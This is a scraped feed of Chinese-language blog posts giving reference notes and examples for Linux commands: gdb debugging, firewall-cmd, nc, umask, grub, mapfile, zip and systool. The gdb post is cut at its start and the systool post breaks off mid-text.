函数是第一个可执行语句处。 上面最后一行信息为：下一条将要执行的源代码为“n = 1;”，它是源代码文件 gdb-sample.c 中的第19行。 下面使用“s”命令（Step）执行下一行代码（即第 19 行“n = 1;”）： (gdb) s 20 n++; 上面的信息表示已经执行完“n = 1;”，并显示下一条要执行的代码为第 20 行的“n++;”。 既然已经执行了“n = 1;”，即给变量 n 赋值为 1，那我们用“p”命令（Print）看一下变量 n 的值是不是 1 ： (gdb) p n $1 = 1 果然是 1。（$1大致是表示这是第一次使用“p”命令——再次执行“p n”将显示“$2 = 1”——此信息应该没有什么用处。） 下面我们分别在第26行、tempFunction 函数开头各设置一个断点（分别使用命令“b 26”“b tempFunction”）： (gdb) b 26 Breakpoint 2 at 0x804837b: file gdb-sample.c, line 26. (gdb) b tempFunction Breakpoint 3 at 0x804832e: file gdb-sample.c, line 12. 使用“c”命令继续（Continue）执行被调试程序，程序将中断在第二 个断点（26行），此时全局变量 nGlobalVar 的值应该是 88；再一次执行“c”命令，程序将中断于第三个断点（12行，tempFunction 函数开头处），此时 tempFunction 函数的两个参数 a、b 的值应分别是 1 和 2： (gdb) c Continuing. Breakpoint 2, main () at gdb-sample.c:26 26 printf(&quot;n = %d, nGlobalVar = %d /n&quot;, n, nGlobalVar); (gdb) p nGlobalVar $2 = 88 (gdb) c Continuing. n = 1, nGlobalVar = 88 Breakpoint 3, tempFunction (a=1, b=2) at gdb-sample.c:12 12 printf(&quot;tempFunction is called, a = %d, b = %d /n&quot;, a, b); (gdb) p a $3 = 1 (gdb) p b $4 = 2 上面反馈的信息一切都在我们预料之中~~ 再一次执行“c”命令（Continue），因为后面再也没有其它断点，程序将一直执行到结束： (gdb) c Continuing. tempFunction is called, a = 1, b = 2 n = 3 Program exited normally. 有时候需要看到编译器生成的汇编代码，以进行汇编级的调试或跟踪，又该如何操作呢？ 这就要用到display命令“display /i $pc”了（此命令前面已有详细解释）： (gdb) display /i $pc (gdb) 此后程序再中断时，就可以显示出汇编代码了： (gdb) r Starting program: /home/liigo/temp/test_jmp/test_jmp/gdb-sample Breakpoint 1, main () at gdb-sample.c:19 19 n = 1; 1: x/i $pc 0x804835c &lt;main+16&gt;: movl $0x1,0xfffffffc(%ebp) 看到了汇编代码，“n = 1;”对应的汇编代码是“movl $0x1,0xfffffffc(%ebp)”。 并且以后程序每次中断都将显示下一条汇编指定（“si”命令用于执行一条汇编代码——区别于“s”执行一行C代码）： (gdb) si 20 n++; 1: x/i $pc 0x8048363 &lt;main+23&gt;: lea 0xfffffffc(%ebp),%eax (gdb) si 0x08048366 20 n++; 1: x/i $pc 0x8048366 &lt;main+26&gt;: incl (%eax) (gdb) si 21 n--; 1: x/i $pc 0x8048368 &lt;main+28&gt;: lea 0xfffffffc(%ebp),%eax (gdb) si 0x0804836b 21 n--; 1: x/i $pc 0x804836b &lt;main+31&gt;: decl (%eax) (gdb) si 23 nGlobalVar += 100; 1: x/i $pc 0x804836d &lt;main+33&gt;: addl $0x64,0x80494fc 接下来我们试一下命令“b *&lt;函数名称&gt;”。 为了更简明，有必要先删除目前所有断点（使用“d”命令——Delete breakpoint）： (gdb) d Delete all breakpoints? (y or n) y (gdb) 当被询问是否删除所有断点时，输入“y”并按回车键即可。 下面使用命令“b *main”在 main 函数的 prolog 代码处设置断点（prolog、epilog，分别表示编译器在每个函数的开头和结尾自行插入的代码）： (gdb) b *main Breakpoint 4 at 0x804834c: file gdb-sample.c, line 17. (gdb) r The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /home/liigo/temp/test_jmp/test_jmp/gdb-sample Breakpoint 4, main () at gdb-sample.c:17 17 { 1: x/i $pc 0x804834c &lt;main&gt;: push %ebp (gdb) si 0x0804834d 17 { 1: x/i $pc 0x804834d &lt;main+1&gt;: mov %esp,%ebp (gdb) si 0x0804834f in main () at gdb-sample.c:17 17 { 1: x/i $pc 0x804834f &lt;main+3&gt;: sub $0x8,%esp (gdb) si 0x08048352 17 { 1: x/i $pc 0x8048352 &lt;main+6&gt;: and $0xfffffff0,%esp (gdb) si 0x08048355 17 { 1: x/i $pc 0x8048355 &lt;main+9&gt;: mov $0x0,%eax (gdb) si 0x0804835a 17 { 1: x/i $pc 0x804835a &lt;main+14&gt;: sub %eax,%esp (gdb) si 19 n = 1; 1: x/i $pc 0x804835c &lt;main+16&gt;: movl $0x1,0xfffffffc(%ebp) 此时可以使用“i r”命令显示寄存器中的当前值———“i r”即“Infomation Register”： (gdb) i r eax 0xbffff6a4 -1073744220 ecx 0x42015554 1107383636 edx 0x40016bc8 1073834952 ebx 0x42130a14 1108544020 esp 0xbffff6a0 0xbffff6a0 ebp 0xbffff6a8 0xbffff6a8 esi 0x40015360 1073828704 edi 0x80483f0 134513648 eip 0x8048366 0x8048366 eflags 0x386 902 cs 0x23 35 ss 0x2b 43 ds 0x2b 43 es 0x2b 43 fs 0x0 0 gs 0x33 51 当然也可以显示任意一个指定的寄存器值： (gdb) i r eax eax 0xbffff6a4 -1073744220 最后一个要介绍的命令是“q”，退出（Quit）GDB调试环境： (gdb) q The program is running. exit anyway? (y or n) ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"gdb","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/gdb/","stats":{"text":"13 min read","time":727000,"words":2782,"minutes":13},"date":"2022-02-02 15:24:57","dateFormat":"2022-02-02"},{"content":"Linux 上新用的防火墙软件，跟 iptables 差不多的工具。 补充说明 firewall-cmd 是 firewalld 的字符界面管理工具，firewalld 是 centos7 的一大特性，最大的好处有两个：支持动态更新，不用重启服务； 第二个就是加入了防火墙的“zone”概念。 firewalld 跟 iptables 比起来至少有两大好处： firewalld 可以动态修改单条规则，而不需要像 iptables 那样，在修改了规则后必须得全部刷新才可以生效。 firewalld 在使用上要比 iptables 人性化很多，即使不明白“五张表五条链”而且对 TCP/IP 协议也不理解也可以实现大部分功能。 firewalld 自身并不具备防火墙的功能，而是和 iptables 一样需要通过内核的 netfilter 来实现，也就是说 firewalld 和 iptables 一样，他们的作用都是用于维护规则，而真正使用规则干活的是内核的 netfilter，只不过 firewalld 和 iptables 的结 构以及使用方法不一样罢了。 命令格式 firewall-cmd [选项 ... ] 选项 通用选项 -h, --help # 显示帮助信息； -V, --version # 显示版本信息. （这个选项不能与其他选项组合）； -q, --quiet # 不打印状态消息； 状态选项 --state # 显示 firewalld 的状态； --reload # 不中断服务的重新加载； --complete-reload # 中断所有连接的重新加载； --runtime-to-permanent # 将当前防火墙的规则永久保存； --check-config # 检查配置正确性； 日志选项 --get-log-denied # 获取记录被拒绝的日志； --set-log-denied=&lt;value&gt; # 设置记录被拒绝的日志，只能为 'all','unicast','broadcast','multicast','off' 其中的一个； 实例 # 安装firewalld yum install firewalld firewall-config systemctl start firewalld # 启动 systemctl stop firewalld # 停止 systemctl enable firewalld # 启用自动启动 systemctl disable firewalld # 禁用自动启动 systemctl status firewalld # 或者 firewall-cmd --state 查看状态 # 关闭服务的方法 # 你也可以关闭目前还不熟悉的FirewallD防火墙，而使用iptables，命令如下： systemctl stop firewalld systemctl disable firewalld yum install iptables-services systemctl start iptables systemctl enable iptables 配置 firewalld firewall-cmd --version # 查看版本 firewall-cmd --help # 查看帮助 # 查看设置： firewall-cmd --state # 显示状态 firewall-cmd --get-active-zones # 查看区域信息 firewall-cmd --get-zone-of-interface=eth0 # 查看指定接口所属区域 firewall-cmd --panic-on # 拒绝所有包 firewall-cmd --panic-off # 取消拒绝状态 firewall-cmd --query-panic # 查看是否拒绝 firewall-cmd --reload # 更新防火墙规则 firewall-cmd --complete-reload # 两者的区别就是第一个无需断开连接，就是firewalld特性之一动态添加规则，第二个需要断开连接，类似重启服务 # 将接口添加到区域，默认接口都在public firewall-cmd --zone=public --add-interface=eth0 # 永久生效再加上 --permanent 然后reload防火墙 # 设置默认接口区域，立即生效无需重启 firewall-cmd --set-default-zone=public # 查看所有打开的端口： firewall-cmd --zone=dmz --list-ports # 加入一个端口到区域： firewall-cmd --zone=dmz --add-port=8080/tcp # 若要永久生效方法同上 # 打开一个服务，类似于将端口可视化，服务需要在配置文件中添加，/etc/firewalld 目录下有services文件夹，这个不详细说了，详情参考文档 firewall-cmd --zone=work --add-service=smtp # 移除服务 firewall-cmd --zone=work --remove-service=smtp # 显示支持的区域列表 firewall-cmd --get-zones # 设置为家庭区域 firewall-cmd --set-default-zone=home # 查看当前区域 firewall-cmd --get-active-zones # 设置当前区域的接口 firewall-cmd --get-zone-of-interface=enp03s # 显示所有公共区域（public） firewall-cmd --zone=public --list-all # 临时修改网络接口（enp0s3）为内部区域（internal） firewall-cmd --zone=internal --change-interface=enp03s # 永久修改网络接口enp03s为内部区域（internal） firewall-cmd --permanent --zone=internal --change-interface=enp03s 服务管理 # 显示服务列表 Amanda, FTP, Samba和TFTP等最重要的服务已经被FirewallD提供相应的服务，可以使用如下命令查看： firewall-cmd --get-services # 允许SSH服务通过 firewall-cmd --new-service=ssh # 禁止SSH服务通过 firewall-cmd --delete-service=ssh # 打开TCP的8080端口 firewall-cmd --enable ports=8080/tcp # 临时允许Samba服务通过600秒 firewall-cmd --enable service=samba --timeout=600 # 显示当前服务 firewall-cmd --list-services # 添加HTTP服务到内部区域（internal） firewall-cmd --permanent --zone=internal --add-service=http firewall-cmd --reload # 在不改变状态的条件下重新加载防火墙 端口管理 # 打开443/TCP端口 firewall-cmd --add-port=443/tcp # 永久打开3690/TCP端口 firewall-cmd --permanent --add-port=3690/tcp # 永久打开端口好像需要reload一下，临时打开好像不用，如果用了reload临时打开的端口就失效了 # 其它服务也可能是这样的，这个没有测试 firewall-cmd --reload # 查看防火墙，添加的端口也可以看到 firewall-cmd --list-all 直接模式 # FirewallD包括一种直接模式，使用它可以完成一些工作，例如打开TCP协议的9999端口 firewall-cmd --direct -add-rule ipv4 filter INPUT 0 -p tcp --dport 9000 -j ACCEPT firewall-cmd --reload 自定义服务管理 选项 （末尾带有 [P only] 的话表示该选项除了与（--permanent）之外，不能与其他选项一同使用！） --new-service=&lt;服务名&gt; 新建一个自定义服务 [P only] --new-service-from-file=&lt;文件名&gt; [--name=&lt;服务名&gt;] 从文件中读取配置用以新建一个自定义服务 [P only] --delete-service=&lt;服务名&gt; 删除一个已存在的服务 [P only] --load-service-defaults=&lt;服务名&gt; Load icmptype default settings [P only] --info-service=&lt;服务名&gt; 显示该服务的相关信息 --path-service=&lt;服务名&gt; 显示该服务的文件的相关路径 [P only] --service=&lt;服务名&gt; --set-description=&lt;描述&gt; 给该服务设置描述信息 [P only] --service=&lt;服务名&gt; --get-description 显示该服务的描述信息 [P only] --service=&lt;服务名&gt; --set-short=&lt;描述&gt; 给该服务设置一个简短的描述 [P only] --service=&lt;服务名&gt; --get-short 显示该服务的简短描述 [P only] --service=&lt;服务名&gt; --add-port=&lt;端口号&gt;[-&lt;端口号&gt;]/&lt;protocol&gt; 给该服务添加一个新的端口(端口段) [P only] --service=&lt;服务名&gt; --remove-port=&lt;端口号&gt;[-&lt;端口号&gt;]/&lt;protocol&gt; 从该服务上移除一个端口(端口段) [P only] --service=&lt;服务名&gt; --query-port=&lt;端口号&gt;[-&lt;端口号&gt;]/&lt;protocol&gt; 查询该服务是否添加了某个端口(端口段) [P only] --service=&lt;服务名&gt; --get-ports 显示该服务添加的所有端口 [P only] --service=&lt;服务名&gt; --add-protocol=&lt;protocol&gt; 为该服务添加一个协议 [P only] --service=&lt;服务名&gt; --remove-protocol=&lt;protocol&gt; 从该服务上移除一个协议 [P only] --service=&lt;服务名&gt; --query-protocol=&lt;protocol&gt; 查询该服务是否添加了某个协议 [P only] --service=&lt;服务名&gt; --get-protocols 显示该服务添加的所有协议 [P only] --service=&lt;服务名&gt; --add-source-port=&lt;端口号&gt;[-&lt;端口号&gt;]/&lt;protocol&gt; 添加新的源端口(端口段)到该服务 [P only] --service=&lt;服务名&gt; --remove-source-port=&lt;端口号&gt;[-&lt;端口号&gt;]/&lt;protocol&gt; 从该服务中删除源端口(端口段) [P only] --service=&lt;服务名&gt; --query-source-port=&lt;端口号&gt;[-&lt;端口号&gt;]/&lt;protocol&gt; 查询该服务是否添加了某个源端口(端口段) [P only] --service=&lt;服务名&gt; --get-source-ports 显示该服务所有源端口 [P only] --service=&lt;服务名&gt; --add-module=&lt;module&gt; 为该服务添加一个模块 [P only] --service=&lt;服务名&gt; --remove-module=&lt;module&gt; 为该服务移除一个模块 [P only] --service=&lt;服务名&gt; --query-module=&lt;module&gt; 查询该服务是否添加了某个模块 [P only] --service=&lt;服务名&gt; --get-modules 显示该服务添加的所有模块 [P only] --service=&lt;服务名&gt; --set-destination=&lt;ipv&gt;:&lt;address&gt;[/&lt;mask&gt;] Set destination for ipv to address in service [P only] --service=&lt;服务名&gt; --remove-destination=&lt;ipv&gt; Disable destination for ipv i service [P only] --service=&lt;服务名&gt; --query-destination=&lt;ipv&gt;:&lt;address&gt;[/&lt;mask&gt;] Return whether destination ipv is set for service [P only] --service=&lt;服务名&gt; --get-destinations List destinations in service [P only] 控制端口 / 服务 可以通过两种方式控制端口的开放，一种是指定端口号另一种是指定服务名。虽然开放 http 服务就是开放了 80 端口，但是还是不能通过端口号来关闭，也就是说通过指定服务名开放的就要通过指定服务名关闭； 通过指定端口号开放的就要通过指定端口号关闭。还有一个要注意的就是指定端口的时候一定要指定是什么协议，tcp 还是 udp。知道这个之后以后就不用每次先关防火墙了，可以让防火墙真正的生效。 firewall-cmd --add-service=mysql # 开放mysql端口 firewall-cmd --remove-service=http # 阻止http端口 firewall-cmd --list-services # 查看开放的服务 firewall-cmd --add-port=3306/tcp # 开放通过tcp访问3306 firewall-cmd --remove-port=80tcp # 阻止通过tcp访问3306 firewall-cmd --add-port=233/udp # 开放通过udp访问233 firewall-cmd --list-ports # 查看开放的端口 伪装 IP firewall-cmd --query-masquerade # 检查是否允许伪装IP firewall-cmd --add-masquerade # 允许防火墙伪装IP firewall-cmd --remove-masquerade# 禁止防火墙伪装IP 端口转发 端口转发可以将指定地址访问指定的端口时，将流量转发至指定地址的指定端口。转发的目的如果不指定 ip 的话就默认为本机，如果指定了 ip 却没指定端口，则默认使用来源端口。如果配置好端口转发之后不能用，可以检查下面两个问题： 比如我将 80 端口转发至 8080 端口，首先检查本地的 80 端口和目标的 8080 端口是否开放监听了 其次检查是否允许伪装 IP，没允许的话要开启伪装 IP firewall-cmd --add-forward-port=port=80:proto=tcp:toport=8080 # 将80端口的流量转发至8080 firewall-cmd --add-forward-port=port=80:proto=tcp:toaddr=192.168.0.1 # 将80端口的流量转发至192.168.0.1 firewall-cmd --add-forward-port=port=80:proto=tcp:toaddr=192.168.0.1:toport=8080 # 将80端口的流量转发至192.168.0.1的8080端口 当我们想把某个端口隐藏起来的时候，就可以在防火墙上阻止那个端口访问，然后再开一个不规则的端口，之后配置防火墙的端口转发，将流量转发过去。 端口转发还可以做流量分发，一个防火墙拖着好多台运行着不同服务的机器，然后用防火墙将不同端口的流量转发至不同机器。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"firewall-cmd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/firewall-cmd/","stats":{"text":"12 min read","time":677000,"words":2707,"minutes":12},"date":"2022-02-02 15:22:07","dateFormat":"2022-02-02"},{"content":"用于设置路由器，是网络工具中的瑞士军刀。 补充说明 nc 命令全称 netcat，用于设置路由器。它能通过 TCP 和 UDP 在网络中读写数据。通过与其他工具结合和重定向，你可以在脚本中以多种方式使用它。使用 netcat 命令所能完成的事情令人惊讶。 语法 nc [-hlnruz][-g&lt;网关...&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;] [-s&lt;来源位址&gt;][-v...][-w&lt;超时秒数&gt;][主机名称][通信端口...] 选项 -g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。 -G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。 -h 在线帮助。 -i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。 -l 使用监听模式，管控传入的资料。 -n 直接使用IP地址，而不通过域名服务器。 -o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。 -p&lt;通信端口&gt; 设置本地主机使用的通信端口。 -r 乱数指定本地与远端主机的通信端口。 -s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。 -u 使用UDP传输协议。 -v 显示指令执行过程。 -w&lt;超时秒数&gt; 设置等待连线的时间。 -z 使用0输入/输出模式，只在扫描通信端口时使用。 实例 TCP 端口扫描 [root@localhost ~]# nc -v -z -w2 192.168.0.3 1-100 192.168.0.3: inverse host lookup failed: Unknown host (UNKNOWN) [192.168.0.3] 80 (http) open (UNKNOWN) [192.168.0.3] 23 (telnet) open (UNKNOWN) [192.168.0.3] 22 (ssh) open 扫描 192.168.0.3 的端口 范围是 1-100 扫描 UDP 端口 [root@localhost ~]# nc -u -z -w2 192.168.0.1 1-1000 # 扫描 192.168.0.3 的端口 范围是 1-1000 扫描指定端口 [root@localhost ~]# nc -nvv 192.168.0.1 80 # 扫描 80端口 (UNKNOWN) [192.168.0.1] 80 (?) open y //用户输入 查看从服务器到目的地的出站端口 443 是否被防火墙阻止 nc -vz acme-v02.api.example.org 443 -w2 # Ncat: Version 7.50 ( https://nmap.org/ncat ) # Ncat: Connected to x.x.x.x:443. # Ncat: 0 bytes sent, 0 bytes received in 0.07 seconds. ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"nc","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/nc/","stats":{"text":"3 min read","time":154000,"words":605,"minutes":3},"date":"2022-02-02 15:05:09","dateFormat":"2022-02-02"},{"content":"显示或设置创建文件的权限掩码。。 概要 umask [-p] [-S] [mode] 主要用途 显示当前的文件权限掩码。 通过八进制数的方式设置创建文件的权限掩码。 通过符号组合的方式设置创建文件的权限掩码。 参数 mode（可选）：八进制数或符号组合。 选项 -p：当没有参数时指定该选项，执行产生的输出格式可复用为输入； -S：以符号组合的方式输出创建文件的权限掩码，不使用该选项时以八进制数的形式输出。 返回值 返回状态为成功除非给出了非法选项或非法参数。 例子 以下的例子均假设文件权限掩码为 0022。 # 以八进制数的形式输出创建文件的权限掩码。 umask -p # 执行结果： umask 0022 # 以符号组合的方式输出创建文件的权限掩码。 umask -S # 执行结果： u=rwx,g=rx,o=rx 参考man chmod文档的DESCRIPTION段落得知： u符号代表当前用户。 g符号代表和当前用户在同一个组的用户，以下简称组用户。 o符号代表其他用户。 a符号代表所有用户。 r符号代表读权限以及八进制数4。 w符号代表写权限以及八进制数2。 x符号代表执行权限以及八进制数1。 +符号代表添加目标用户相应的权限。 -符号代表删除目标用户相应的权限。 =符号代表添加目标用户相应的权限，删除未提到的权限。 那么刚才以符号形式输出的结果u=rwx,g=rx,o=rx转化为八进制数等于0755； 用八进制数来设置同样的权限，umask需要额外的执行减法0777 - 0755即0022，而chmod不需要。 符号组合模式的添加、删除、赋值权限。 # 添加权限： # 为组用户添加写权限。 umask g+w # 删除权限： # 删除其他用户的写、执行权限 umask o-wx # 赋值权限： # 赋值全部用户所有权限，等价于umask u=rwx,g=rwx,o=rwx umask a=rwx # 清除其他用户的读、写、执行权限。 umask o= 创建文件夹、文件（假设当前目录不存在） # 创建文件 touch test.sh # 查看权限，发现执行权限的设置不起作用。 stat test.sh # 创建文件夹 touch newdir # 查看权限，发现执行权限的设置可以起作用。 stat newdir 注意 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 chmod用于更改已有对象的权限，umask影响之后新建对象的权限。 请谨慎使用该命令，特别是不要取消当前用户的读取权限，那样会导致你在终端使用TAB键补全时报错。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"umask","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/umask/","stats":{"text":"3 min read","time":157000,"words":725,"minutes":3},"date":"2022-02-02 15:04:03","dateFormat":"2022-02-02"},{"content":"多重引导程序 grub 的命令行 shell 工具。 补充说明 grub 命令是多重引导程序 grub 的命令行 shell 工具。 语法 grub (选项) 选项 --batch：打开批处理模式； --boot-drive=&lt;驱动器&gt;：指定 stage2 的引导驱动器； --config-file&lt;配置文件&gt;：指定 stage2 的配置文件； --device-map=&lt;文件&gt;：指定设备的映射文件； --help：显示帮助信息； --install-partition=&lt;分区&gt;：指定 stage2 安装分区； --no-config-file：不使用配置文件； --no-pager：不使用内部分页器； --preset-menu：使用预设菜单； --probe-second-floppy：检测第二个软盘驱动器； --read-only：只读模式。 实例 利用 grub 命令来启动损坏的 Linux 系统，可能你的电脑因为某些原因损坏不能自动启动了。当然原因很多，可能的现象也很多。 这里说一下这种情况下的处理方法，即：屏幕上提示grub&gt;，但你的硬盘上数据没有丢失，各分区都是好的。这种情况是你的 grub 信息损坏了，但比较严重的是系统启动不了。 当然，在正常启动情况下，屏幕上出现 grub 的启动项选择菜单时按c键也是可以进入grub&gt;状态的。这时候我们需要用 grub 的命令来手工启动系统。 只需要用到四个命令 boot、kernel、initrd、boot。 但 grub 本身命令很多，比如查看文件内容的 cat ，你输入 help 会得到。 首先，输入“ root (hd ” ，然后按两次 TAB 键； /* 这会列出你电脑上可能的磁盘设备，硬盘为 hd0/hd1 或 sd0/sd1 等 / 然后，选择你的安装 Linux 系统的硬盘，比如 hd0 ，输入 “ root (hd0, ” 再按两次 TAB 键； / 这会列出你的第一块硬盘上的分区情况，你会知道哪个是 swap 交换分区， 0x82 ，哪个是 Linux 分区 0x83 */ 选择你认为可能的 /boot 目录所在的分区， 输入root (hd0, 1)回车； 接着，输入cat /boot/vm， 按两次 TAB 键，如果出现一些 vm 开头的文件，比如 vmlinuz-2.6.15-26-386 说明这里是 /boot 所在的分区。 删除上一次的输入，再输入cat /boot/initrd，按两次 TAB 键，如果出现一些 initrd 开头的文件，比如 initrd.img-2.6.15-26-386 说明这个 /boot 所在的分区有 initrd ，即 ramdisk 镜像； 删除上一次的输入，再输入cat /sbin/init，按两次 TAB 键，如果出现一些 init 开头的文件，比如/sbin/init说明这个分区是/所在的分区； 如果没有出现/sbin/init文件，说明(hd0,1)分区仅仅是/boot分区而不是/分区。重新输入root (hd0,N)命令，这里 N 是某个 Linux 分区，然后再试cat /sbin/init， 直到屏幕上出现/sbin/init，说明你找到了/分区，严格来说，应该是/sbin目录所在的分区； 依次输入命令： root (hd0,1) /* 假设 /dev/hda2 是你的 /boot 所在的分区 */ kernel /boot/vmlinuz-2.6.15-26-386 ro dev=/dev/hda3 /* 假设 /dev/hda3 是你的 / 所在的分区 */ initrd /boot/initrd.img-2.6.15-26-386 boot 即可启动系统。 这里的关键问题是如何确定系统的几个分区：/boot / /sbin ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"grub","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/grub/","stats":{"text":"4 min read","time":190000,"words":816,"minutes":4},"date":"2022-02-02 15:01:41","dateFormat":"2022-02-02"},{"content":"从标准输入读取行并赋值到数组。。 概要 mapfile [-d delim] [-n count] [-O origin] [-s count] [-t] [-u fd] [-C callback] [-c quantum] [array] 主要用途 从标准输入或文件描述符读取行并赋值到数组。 选项 -d delim 将delim设为行分隔符，代替默认的换行符。 -n count 从标准输入中获取最多count行，如果count为零那么获取全部。 -O origin 从数组下标为origin的位置开始赋值，默认的下标为0。 -s count 跳过对前count行的读取。 -t 读取时移除行分隔符delim（默认为换行符）。 -u fd 从文件描述符fd中读取。 -C callback 每当读取了quantum行时，调用callback语句。 -c quantum 设定读取的行数为quantum。 如果使用-C时没有同时使用-c指定quantum的值，那么quantum默认为5000。 当callback语句执行时，将数组下一个要赋值的下标以及读取的行作为额外的参数传递给callback语句。 如果使用-O时没有提供起始位置，那么mapfile会在实际赋值之前清空该数组。 参数 array（可选）：用于输出的数组名称。如果没有指定数组名称，那么会默认写入到变量名为 MAPFILE 的数组中。 返回值 返回成功除非使用了非法选项、指定的数组是只读的、指定的数组不是下标数组。 例子 # 常见的读取形式。 mapfile &lt; source_file target_array cat source_file |mapfile target_array mapfile -u fd target_array # 只读取前5行。 mapfile &lt; source_file -n 5 target_array # 跳过前5行。 mapfile &lt; source_file -s 5 target_array # 在数组指定的下标开始赋值。 # 请注意：这样做不会清空该数组。 mapfile &lt; source_file -O 2 target_array # 读取时设定行分隔符为tab。 # 注意，第二行的tab在终端需要用ctrl+v tab输入； mapfile &lt; source_file -d $'\\t' target_array mapfile &lt; source_file -d ' ' target_array # 读取时移除行分隔符（tab）。 mapfile &lt; source_file -d $'\\t' -t target_array # 读取时移除行分隔符（换行符）。 mapfile &lt; source_file -t target_array # 每读取2行，执行一次语句（在这里是echo）。 mapfile &lt; source_file -C &quot;echo CALLBACK:&quot; -c 2 target_array # 遍历下标，依次显示数组的元素。 for i in ${!target_array[@]}; do printf &quot; 注意 该命令是 bash 内建命令，相关的帮助信息请查看help命令。 bash 内建命令 readarray 是 mapfile 的同义词。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"mapfile","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/mapfile/","stats":{"text":"3 min read","time":141000,"words":590,"minutes":3},"date":"2022-02-02 15:01:04","dateFormat":"2022-02-02"},{"content":"可以用来解压缩文件。 补充说明 zip 命令可以用来解压缩文件，或者对文件进行打包操作。zip 是个使用广泛的压缩程序，文件经它压缩后会另外产生具有“.zip”扩展名的压缩文件。 语法 zip (选项) (参数) 选项 -A：调整可执行的自动解压缩文件； -b&lt;工作目录&gt;：指定暂时存放文件的目录； -c：替每个被压缩的文件加上注释； -d：从压缩文件内删除指定的文件； -D：压缩文件内不建立目录名称； -f：此参数的效果和指定“-u”参数类似，但不仅更新既有文件，如果某些文件原本不存在于压缩文件内，使用本参数会一并将其加入压缩文件中； -F：尝试修复已损坏的压缩文件； -g：将文件压缩后附加在已有的压缩文件之后，而非另行建立新的压缩文件； -h：在线帮助； -i&lt;范本样式&gt;：只压缩符合条件的文件； -j：只保存文件名称及其内容，而不存放任何目录名称； -J：删除压缩文件前面不必要的数据； -k：使用 MS-DOS 兼容格式的文件名称； -l：压缩文件时，把 LF 字符置换成 LF+CR 字符； -ll：压缩文件时，把 LF+cp 字符置换成 LF 字符； -L：显示版权信息； -m：将文件压缩并加入压缩文件后，删除原始文件，即把文件移到压缩文件中； -n&lt;字尾字符串&gt;：不压缩具有特定字尾字符串的文件； -o：以压缩文件内拥有最新更改时间的文件为准，将压缩文件的更改时间设成和该文件相同； -q：不显示指令执行过程； -r：递归处理，将指定目录下的所有文件和子目录一并处理； -S：包含系统和隐藏文件； -t&lt;日期时间&gt;：把压缩文件的日期设成指定的日期； -T：检查备份文件内的每个文件是否正确无误； -u：更换较新的文件到压缩文件内； -v：显示指令执行过程或显示版本信息； -V：保存 VMS 操作系统的文件属性； -w：在文件名称里假如版本编号，本参数仅在 VMS 操作系统下有效； -x&lt;范本样式&gt;：压缩时排除符合条件的文件； -X：不保存额外的文件属性； -y：直接保存符号连接，而非该链接所指向的文件，本参数仅在 UNIX 之类的系统下有效； -z：替压缩文件加上注释； -$：保存第一个被压缩文件所在磁盘的卷册名称； -&lt;压缩效率&gt;：压缩效率是一个介于 1~9 的数值。 参数 zip 压缩包：指定要创建的 zip 压缩包； 文件列表：指定要压缩的文件列表。 实例 将/home/Blinux/html/这个目录下所有文件和文件夹打包为当前目录下的 html.zip： zip -q -r html.zip /home/Blinux/html 上面的命令操作是将绝对地址的文件及文件夹进行压缩，以下给出压缩相对路径目录，比如目前在 Bliux 这个目录下，执行以下操作可以达到以上同样的效果： zip -q -r html.zip html 比如现在我的 html 目录下，我操作的 zip 压缩命令是： zip -q -r html.zip * 压缩效率选择: zip -9 # 1-9 faster-&gt;better 问题解决 CentOS7 中命令找不到 -Bash: Unzip: Command Not Found 解决方法 yum install -y unzip zip ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"zip","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/zip/","stats":{"text":"4 min read","time":204000,"words":929,"minutes":4},"date":"2022-02-02 15:00:28","dateFormat":"2022-02-02"},{"content":"显示基于总线、类和拓扑显示系统中设备的信息。 补充说明 systool 命令指令显示基于总线、类和拓扑显示系统中设备的信息。 语法 systool (选项) (参数) 选项 -a：显示被请求资源的属性； -b&lt;总线&gt;：显示指定总线的信息； -c&lt;class&gt;：显示指定类的信息； -d：仅显示设备； -h：显示指令的用法； -m&lt;模块名称&gt;：显示指定模块的信息； -p：显示资源的“sysfs”绝对路径； -v：显示所有属性； -A&lt;属性&gt;：显示请求资源的属性值； -D：仅显示驱动程序信息； -P：显示设备的父类。 参数 设备：指定要查看信息的设备名称。 实例 [root@localhost ~]# systool Supported sysfs buses: acpi i2c ide pci_express pci pcmcia platform pnp scsi serio usb Supported sysfs classes: backlight cpuid dma_v3 firmware graphics hidraw hwmon i2c-adapter input leds mem misc msr net pci_bus pcmcia_socket printer raw sas_device sas_end_device sas_expander sas_host sas_phy sas_port scsi_device scsi_disk scsi_generic scsi_host sound tty usb_device usb_endpoint usb_host vc vtconsole Supported sysfs devices: acpi pci0000:00 platform pnp0 sequencer2 sequencer seq system timer Supported sysfs 